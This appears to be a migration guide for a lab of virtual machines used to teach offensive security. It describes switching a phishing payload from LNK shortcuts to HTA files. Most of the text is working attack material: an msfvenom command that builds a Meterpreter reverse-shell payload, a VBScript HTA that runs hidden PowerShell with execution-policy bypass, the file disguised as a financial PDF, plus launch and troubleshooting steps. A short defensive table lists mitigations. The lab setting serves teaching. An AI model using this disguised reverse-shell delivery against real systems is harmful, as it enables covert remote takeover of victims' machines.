# LNK to HTA Migration Guide

## Problem Summary

The original exploit used Windows shortcut (.lnk) files created by the pylnk3 Python library. However, these LNK files had a critical issue:

**Issue:** Empty Target Field
- LNK files created by pylnk3 have empty Target fields when downloaded to Windows
- Files appear valid (126 bytes, .lnk extension recognized)
- But Windows cannot execute LNK files with empty targets
- Double-clicking the file does nothing

**Root Cause:** pylnk3 library compatibility issue with Windows LNK file structure

## Solution: HTA (HTML Application) Exploit

Migrated from LNK to HTA files for reliable payload delivery.

### Comparison

| Aspect | LNK Approach | HTA Approach |
|--------|-------------|--------------|
| File Format | Binary Windows shortcut | Text-based HTML/VBScript |
| Execution | Shell32.dll (Windows Explorer) | mshta.exe (Windows HTA handler) |
| Compatibility | Works if Target field is valid | Works on all Windows versions |
| Library Issue | pylnk3 creates broken LNK files | No library issues (plain text) |
| Creation | Python library (unreliable) | Direct file writing (reliable) |
| Execution Control | Limited (Target + Arguments) | Full VBScript capabilities |
| Social Engineering | Good (PDF icon, hidden .lnk) | Good (PDF icon, hidden .hta) |
| Detection | Moderate | Similar (both used by attackers) |

## Migration Steps

### 1. Files Changed

**Removed/Deprecated:**
- `vagrant/provisioning/kali/create_lnk_exploit.sh` - No longer used
- `/home/vagrant/lnk_payloads/` directory - Deprecated

**Added:**
- `vagrant/provisioning/kali/create_hta_exploit.sh` - HTA payload generation
- `exploits/hta/start_hta_attack.sh` - Attack launcher
- `exploits/hta/diagnose_hta_issue.sh` - Test HTA files
- `exploits/hta/download_hta_powershell.ps1` - Windows download script
- `exploits/hta/README.md` - Complete documentation
- `/home/vagrant/hta_payloads/` directory - New payload location

**Modified:**
- `vagrant/Vagrantfile` - Calls create_hta_exploit.sh instead of create_lnk_exploit.sh
- `vagrant/provisioning/kali/setup_http_autostart.sh` - Serves from hta_payloads directory

### 2. Technical Changes

**Payload Generation (create_hta_exploit.sh):**
```bash
# Step 1: Generate PowerShell Meterpreter payload (unchanged)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.101 LPORT=4444 -f psh \
    -o /home/vagrant/hta_payloads/shell.ps1

# Step 2: Create HTA file (new approach)
cat > Q4_Financial_Report.pdf.hta << 'EOF'
<html>
<head>
<HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_OnLoad
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -ep bypass -w hidden -c ""IEX(...)""", 0, False
    window.close()
End Sub
</script>
</head>
<body>Loading...</body>
</html>
EOF
```

**HTTP Server Configuration:**
- Changed from `/home/vagrant/lnk_payloads` to `/home/vagrant/hta_payloads`
- Service name changed from `lnk-http-server` to `hta-http-server`
- Still binds to 192.168.56.101:8080

### 3. Attack Workflow Changes

**Before (LNK):**
```bash
cd /vagrant/exploits/lnk
./start_lnk_attack.sh
```

**After (HTA):**
```bash
cd /vagrant/exploits/hta
./start_hta_attack.sh
```

**Windows PowerShell download:**
```powershell
# Before
cd C:\vagrant\exploits\lnk
.\download_lnk_powershell.ps1

# After
cd C:\vagrant\exploits\hta
.\download_hta_powershell.ps1
```

## Testing the Migration

### 1. Reprovision VMs

```bash
cd vagrant
vagrant destroy -f
vagrant up
```

This will:
- Generate HTA exploit instead of LNK
- Configure HTTP server for HTA payloads
- Start HTTP server on boot

### 2. Verify on Kali

```bash
vagrant ssh kali

# Check payload directory
ls -lh /home/vagrant/hta_payloads/
# Should show: shell.ps1, Q4_Financial_Report.pdf.hta

# Check HTTP server
systemctl status hta-http-server
# Should be active and running

# Test HTTP
curl http://192.168.56.101:8080/
# Should list HTA files
```

### 3. Test HTA Execution on Windows

```bash
vagrant ssh windows

# Test connectivity
ping 192.168.56.101

# Download test HTA
cd C:\vagrant\exploits\hta
powershell -ExecutionPolicy Bypass -File download_hta_powershell.ps1 -FileName Test1_Calculator.hta

# Double-click Test1_Calculator.hta on Desktop
# Calculator should open = HTA execution works!
```

### 4. Run Full Exploit

**On Kali:**
```bash
cd /vagrant/exploits/hta
./start_hta_attack.sh
```

**On Windows:**
```powershell
cd C:\vagrant\exploits\hta
.\download_hta_powershell.ps1
# Double-click Q4_Financial_Report.pdf.hta on Desktop
```

**Expected Result:**
- Meterpreter session opens on Kali
- No visible window on Windows (hidden execution)

## Why HTA is Better for This Lab

### Reliability
- No library compatibility issues
- Plain text files (easy to edit/customize)
- Consistent behavior across Windows versions

### Educational Value
- HTA is used by real APT groups (APT32, FIN7, Cobalt Group)
- Teaches actual attack technique seen in the wild
- Demonstrates MITRE ATT&CK T1218.005

### Flexibility
- Can run complex VBScript code
- Easy to modify payload delivery method
- Can add custom logic (checks, conditions, etc.)

### Social Engineering
- Still effective with .hta extension hiding
- Can use PDF icon for deception
- File appears as "Q4_Financial_Report.pdf" (extension hidden)

## Defensive Lessons

Students learn how to defend against HTA attacks:

| Defense Mechanism | Implementation |
|------------------|----------------|
| Show Extensions | Folder Options > Uncheck "Hide extensions for known file types" |
| Email Filtering | Block .hta attachments at gateway |
| AppLocker | Create deny rules for mshta.exe |
| WDAC | Windows Defender Application Control policies |
| Monitoring | Track mshta.exe execution with Sysmon/EDR |

## Backward Compatibility

**LNK exploit files remain in repository:**
- `exploits/lnk/` directory kept for reference
- Documentation preserved
- Old scripts not deleted

**Students can study both approaches:**
- Compare LNK vs HTA effectiveness
- Understand why LNK failed (pylnk3 issue)
- Learn multiple social engineering techniques

## References

- [MITRE ATT&CK: Mshta](https://attack.mitre.org/techniques/T1218/005/)
- [APT32 HTA Usage](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)
- [SANS HTA Analysis](https://www.sans.org/blog/hta-malware-analysis/)

## Troubleshooting

### HTA files don't execute
- Verify mshta.exe exists: `C:\Windows\System32\mshta.exe`
- Check file association: `assoc .hta` (should show htafile)
- Test with visible PowerShell: `Test2_PowerShell_Visible.hta`

### HTTP server not serving HTA files
```bash
# On Kali
systemctl status hta-http-server
sudo systemctl restart hta-http-server
curl http://192.168.56.101:8080/
```

### Meterpreter doesn't connect
- Verify handler is listening on port 4444
- Check Windows firewall settings
- Use visible exploit test: `Test4_Full_Exploit_Visible.hta`
